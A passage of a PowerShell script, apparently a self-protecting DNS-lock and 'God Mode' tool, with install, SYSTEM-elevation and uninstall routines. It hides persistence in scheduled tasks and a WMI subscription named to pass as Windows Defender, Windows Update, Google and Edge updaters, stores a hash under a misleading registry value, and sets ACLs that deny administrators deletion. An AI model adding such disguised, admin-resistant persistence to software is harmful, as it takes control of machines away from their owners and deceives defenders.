                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked to SYSTEM (FullControl), Admins (ReadOnly+NoDelete), Users (ReadAndExecute)." -Type "SUCCESS" -Color Green

    Write-Log -Message "Registering self-healing background tasks..." -Type "INFO" -Color Yellow
    
    # 3. Triggers: Run at System Startup, User Logon, and Event ID 10000 (Network Connected)
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    
    $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
    $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
    $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
    $Trigger3.Enabled = $True

    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Registered Scheduled Task: System will auto-heal locks on Reboot & Network Change." -Type "INFO" -Color Gray

    # 4. Guardian 1: Monitors every 5 minutes and restores if tampered
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GuardianTaskName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "Guardian 1 '$GuardianTaskName' registered (5-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.1 Guardian 2: Additional watcher with a 10-minute interval (attacker must kill both)
    $Guardian2Name = "Windows-Defender-AM-Updates"
    $Guardian2Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Guardian2Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 9999)
    $Guardian2Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $Guardian2Name -Action $Guardian2Action -Trigger $Guardian2Trigger -Principal $Guardian2Principal -Force | Out-Null
    Write-Log -Message "Guardian 2 '$Guardian2Name' registered (10-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.2 WMI Event Subscription: Third hidden persistence layer (harder to find than tasks)
    Write-Log -Message "Registering WMI event subscription for persistence..." -Type "INFO" -Color Gray
    try {
        $WmiQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.Name = 'Schedule'"
        $WmiConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"; RunInteractively=$false} -ErrorAction Stop
        $WmiFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query=$WmiQuery} -ErrorAction Stop
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WmiFilter; Consumer=$WmiConsumer} -ErrorAction Stop | Out-Null
        Write-Log -Message "WMI subscription registered (triggers if Schedule service is modified)." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "WMI subscription registration failed: $_" -Type "WARN" -Color Yellow
    }

    # 5. Self-Integrity: Store SHA256 hash in a misleading registry key (harder to tamper than a file)
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $IntegrityRegPath)) { New-Item -Path $IntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Self-integrity hash stored in registry (backup file already written)." -Type "INFO" -Color Gray

    Enable-DNSLock
    Write-Log -Message "INSTALLATION COMPLETE! System is permanently protected." -Type "SUCCESS" -Color Green

    # 6. GPO registry values are protection enough; skip ACL hardening to avoid gpupdate lock conflicts
    Write-Log -Message "GPO registry values enforced. Skipping ACL hardening to avoid gpupdate lock." -Type "INFO" -Color Gray

    # Final status verification
    $FailedCount = 0
    if (-not (Test-Path $InstallDir)) { $FailedCount++; Write-Log -Message "Install directory $InstallDir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $InstallScript)) { $FailedCount++; Write-Log -Message "Install script $InstallScript missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $CmdPath)) { $FailedCount++; Write-Log -Message "Global CLI wrapper $CmdPath missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $IntegrityFile)) { $FailedCount++; Write-Log -Message "Integrity file $IntegrityFile missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task $TaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 1 $GuardianTaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 2 $Guardian2Name missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH does not contain $InstallDir." -Type "ERROR" -Color Red }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiFilter) { Write-Log -Message "WMI event filter missing." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiConsumer) { Write-Log -Message "WMI event consumer missing." -Type "WARN" -Color Yellow }
    Export-RawDebugDump -Trigger "DNS_INSTALL_END"
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] INSTALLATION COMPLETE!" -ForegroundColor Green
        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Success"
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
    }
}

function Invoke-AsSystem {
    param(
        [string]$Command,
        [int]$MaxWaitSeconds = 30
    )

    $TaskId = Get-Random -Minimum 10000 -Maximum 99999
    $CommonTemp = $env:TEMP
    Write-Log -Message "[Invoke-AsSystem] Starting service-based SYSTEM elevation (TaskId=$TaskId)." -Type "INFO" -Color Yellow

    # --- Method 1: Temporary Service (sc.exe) ---
    $ServiceName = "InvokeAsSystemSvc_$TaskId"
    $ResultFile2 = Join-Path $CommonTemp "InvokeAsSystem_SvcResult_$TaskId.txt"
    $BatchFile2 = Join-Path $CommonTemp "InvokeAsSystem_SvcBatch_$TaskId.cmd"

    $BatchContent2 = "@echo off`r`n$Command > `"$ResultFile2`" 2>&1`r`necho ___DONE___ >> `"$ResultFile2`""
    Set-Content -Path $BatchFile2 -Value $BatchContent2 -Encoding ASCII -Force

    try {
        Write-DebugLog -FunctionName "Invoke-AsSystem" -Action "INFO" -Message "Method 2: Temporary service $ServiceName"
        $scCreate = sc.exe create $ServiceName binPath= "cmd.exe /c `"$BatchFile2`"" start= demand
        if ($LASTEXITCODE -eq 0) {
            sc.exe start $ServiceName | Out-Null
            Start-Sleep -Seconds 2

            $waited = 0
            $success = $false
            while ($waited -lt $MaxWaitSeconds) {
                Start-Sleep -Seconds 1
                $waited++
                if (Test-Path $ResultFile2) {
                    $content = Get-Content -Path $ResultFile2 -Raw -ErrorAction SilentlyContinue
                    if ($content -and $content.Contains("___DONE___")) {
                        $output = ($content -replace "___DONE___", "").Trim()
                        $success = $true
                        break
                    }
                }
            }

            sc.exe stop $ServiceName | Out-Null
            sc.exe delete $ServiceName | Out-Null

            Remove-Item -Path $ResultFile2 -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BatchFile2 -Force -ErrorAction SilentlyContinue

            if ($success) {
                Write-Log -Message "[Invoke-AsSystem] Temporary service method succeeded." -Type "INFO" -Color Green
                return [PSCustomObject]@{ Success = $true; Output = $output }
            } else {
                Write-Log -Message "[Invoke-AsSystem] Temporary service method did not produce result within timeout." -Type "WARN" -Color Yellow
            }
        } else {
            Write-Log -Message "[Invoke-AsSystem] Service creation failed (sc.exe exit code: $LASTEXITCODE). Output: $scCreate" -Type "WARN" -Color Yellow
        }
    } catch {
        Write-Log -Message "[Invoke-AsSystem] Service method exception: $_" -Type "WARN" -Color Yellow
    }

    # Cleanup Method 2 artifacts
    sc.exe stop $ServiceName | Out-Null
    sc.exe delete $ServiceName | Out-Null
    Remove-Item -Path $ResultFile2 -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $BatchFile2 -Force -ErrorAction SilentlyContinue

    # --- Method 3: Task Scheduler Fallback ---
    Write-Log -Message "[Invoke-AsSystem] Falling back to Task Scheduler method..." -Type "INFO" -Color Yellow

    $TempTaskName = "DNSGuard-Helper_$TaskId"
    $ResultFile3 = Join-Path $CommonTemp "DNSGuard_Result_$TaskId.txt"
    $BatchFile3 = Join-Path $CommonTemp "DNSGuard_Batch_$TaskId.cmd"

    try {
        # Ensure Task Scheduler service is running
        try {
            $schedService = Get-Service -Name "Schedule" -ErrorAction SilentlyContinue
            if ($schedService -and $schedService.Status -ne 'Running') {
                Start-Service -Name "Schedule" -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 1
            }
        } catch {}

        $BatchContent3 = @"
@echo off
cd /d $CommonTemp
$Command
if %errorlevel% equ 0 (
    echo ___SUCCESS___
) else (
    echo ___FAILED___
)
"@
        Set-Content -Path $BatchFile3 -Value $BatchContent3 -Encoding ASCII -Force
        $Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatchFile3`" > `"$ResultFile3`" 2>&1"
        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TempTaskName -Action $Action -Principal $Principal -Force | Out-Null
        Start-Sleep -Milliseconds 500
        Start-ScheduledTask -TaskName $TempTaskName
        $Waited = 0
        $Completed = $false
        $Success = $false
        while ($Waited -lt $MaxWaitSeconds) {
            Start-Sleep -Seconds 1
            $Waited++
            if (Test-Path $ResultFile3) {
                $ResultText = Get-Content -Path $ResultFile3 -Raw -ErrorAction SilentlyContinue
                if ($ResultText -and ($ResultText.Contains("___SUCCESS___") -or $ResultText.Contains("___FAILED___"))) {
                    $Completed = $true
                    $Success = $ResultText.Contains("___SUCCESS___")
                    break
                }
            }
        }
        Unregister-ScheduledTask -TaskName $TempTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        $Output = ""
        if (Test-Path $ResultFile3) {
            $ResultText = Get-Content -Path $ResultFile3 -Raw -ErrorAction SilentlyContinue
            $Output = ($ResultText -replace "___SUCCESS___", "" -replace "___FAILED___", "").Trim()
            Remove-Item -Path $ResultFile3 -Force -ErrorAction SilentlyContinue
        }
        Remove-Item -Path $BatchFile3 -Force -ErrorAction SilentlyContinue
        if ($Completed) {
            Write-Log -Message "[Invoke-AsSystem] Task Scheduler fallback completed. Success=$Success" -Type "INFO" -Color Yellow
            return [PSCustomObject]@{ Success = $Success; Output = $Output }
        } else {
            Write-Log -Message "[Invoke-AsSystem] Task Scheduler fallback timed out." -Type "ERROR" -Color Red
            return [PSCustomObject]@{ Success = $false; Output = $Output }
        }
    } catch {
        Write-Log -Message "[Invoke-AsSystem] Task Scheduler fallback failed: $_" -Type "ERROR" -Color Red
        Unregister-ScheduledTask -TaskName $TempTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        Remove-Item -Path $ResultFile3 -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $BatchFile3 -Force -ErrorAction SilentlyContinue
        return [PSCustomObject]@{ Success = $false; Output = "" }
    }
}

function Install-GodModePersistence {
    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "ENTRY"
    Export-RawDebugDump -Trigger "GODMODE_INSTALL_START"
    Write-Log -Message "Installing God Mode to System ($GodModeInstallDir)..." -Type "ACTION" -Color Yellow

    # Gate: prevent overwrite
    if (Test-Path $GodModeInstallDir) {
        Write-Log -Message "Installation aborted: $GodModeInstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$GodModeTaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }

    # 1. Secure copy
    if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force
    Write-Log -Message "Payload copied to $GodModeInstallScript." -Type "INFO" -Color Gray

    # 2. Build wrapper
    $WrapperContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" %*"
    $WrapperLocal = Join-Path $GodModeInstallDir "godmode.cmd"
    Out-File -FilePath $WrapperLocal -InputObject $WrapperContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $WrapperLocal." -Type "INFO" -Color Gray

    # 3. Integrity hash
    $ScriptHash = (Get-FileHash -Path $GodModeInstallScript -Algorithm SHA256).Hash
    $GodModeIntegrityFile = Join-Path $GodModeInstallDir "integrity.sha256"
    Set-Content -Path $GodModeIntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash written." -Type "INFO" -Color Gray

    # 4. NTFS hardening
    Write-Log -Message "Hardening NTFS on God Mode directory..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        Write-Log -Message "God Mode directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS: $_" -Type "ERROR" -Color Red
    }

    # 5. Global CLI
    Out-File -FilePath $GodModeCmdPath -InputObject $WrapperContent -Encoding ASCII -Force
    if (-not (Test-Path $GodModeCmdPath)) {
        Write-Log -Message "CRITICAL: godmode wrapper not created at $GodModeCmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $GodModeCmdPath." -Type "SUCCESS" -Color Green
    }

    # 6. PATH
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$GodModeInstallDir*") {
            $NewPath = $CurrentPath + ";" + $GodModeInstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $GodModeInstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$GodModeInstallDir already in PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update PATH: $_" -Type "ERROR" -Color Red
    }

    # 7. Harden wrapper
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($GodModeCmdPath, $WrapperLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked." -Type "SUCCESS" -Color Green

    # 8. Main task: auto-enable God Mode at logon if flag exists
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeTaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Main God Mode task registered." -Type "INFO" -Color Gray

    # 9. Guardian: re-apply every 5 minutes if flag exists
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeGuardianName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "God Mode guardian registered (5-min heartbeat)." -Type "INFO" -Color Gray

    # 10. Integrity in registry (misleading key)
    $GodModeIntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $GodModeIntegrityRegPath)) { New-Item -Path $GodModeIntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $GodModeIntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Integrity hash stored in registry." -Type "INFO" -Color Gray

    Write-Log -Message "GOD MODE INSTALLATION COMPLETE!" -Type "SUCCESS" -Color Green
    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "EXIT" -Message "Success"

    # Final verification
    $FailedCount = 0
    if (-not (Test-Path $GodModeInstallDir)) { $FailedCount++; Write-Log -Message "Install dir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeInstallScript)) { $FailedCount++; Write-Log -Message "Install script missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeCmdPath)) { $FailedCount++; Write-Log -Message "Global CLI missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH missing." -Type "ERROR" -Color Red }
    Export-RawDebugDump -Trigger "GODMODE_INSTALL_END"
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] GOD MODE INSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
    }
}

function Uninstall-GodModePersistence {
    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "ENTRY"
    $IsInstalled = (Test-Path $GodModeInstallDir) -or (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] God Mode is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling God Mode from System..." -Type "ACTION" -Color Yellow
    Disable-GodMode

    # Remove tasks
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed main task $GodModeTaskName." -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeGuardianName -Confirm:$false | Out-Null
        Write-Log -Message "Removed guardian $GodModeGuardianName." -Type "INFO" -Color Gray
    }

    # Remove backup tasks
    $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
    foreach ($Prefix in $BackupPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }
    # Remove deep persistence backup tasks
    $DeepPrefixes = @("WindowsDefenderSigUpdates_", "OneDriveStandaloneUpdater_", "EdgeWebView2Updater_")
    foreach ($Prefix in $DeepPrefixes) {
        try {
            Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue |
                Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        } catch { }
    }

    # Remove registry persistence
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove registry persistence: $_" -Type "WARN" -Color Yellow }

    # Remove deep persistence registry keys
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove deep persistence registry: $_" -Type "WARN" -Color Yellow }

    # Remove global CLI
    if (Test-Path $GodModeCmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $GodModeCmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $GodModeCmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $GodModeCmdPath -Force -ErrorAction Stop
        } catch {
            $Result = Invoke-AsSystem -Command "takeown.exe /F `"$GodModeCmdPath`" & icacls.exe `"$GodModeCmdPath`" /reset & cmd /c del /f /q `"$GodModeCmdPath`""
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $GodModeCmdPath. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $GodModeCmdPath) {
            Write-Log -Message "Failed to remove godmode CLI." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed godmode CLI." -Type "INFO" -Color Gray
        }
    }

    # Remove PATH entry
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$GodModeInstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $GodModeInstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $GodModeInstallDir from PATH." -Type "INFO" -Color Gray
        }
    } catch { Write-Log -Message "Failed to clean PATH: $_" -Type "ERROR" -Color Red }

    # Remove install dir
    if (Test-Path $GodModeInstallDir) {
        # Explicitly delete the installed script file first (bypass ACLs via cmd)
        if (Test-Path $GodModeInstallScript) {
            cmd /c "del /f /q `"$GodModeInstallScript`"" | Out-Null
        }
        try {
            Remove-Item -Path $GodModeInstallDir -Recurse -Force -ErrorAction Stop
        } catch {
            Write-Log -Message "Direct deletion failed for $GodModeInstallDir. Trying SYSTEM cleanup..." -Type "INFO" -Color Yellow
            $SystemCmd = "takeown /F `"$GodModeInstallDir`" /R /D Y & icacls `"$GodModeInstallDir`" /reset /T /C /Q & cmd /c rd /s /q `"$GodModeInstallDir`" 2>nul"
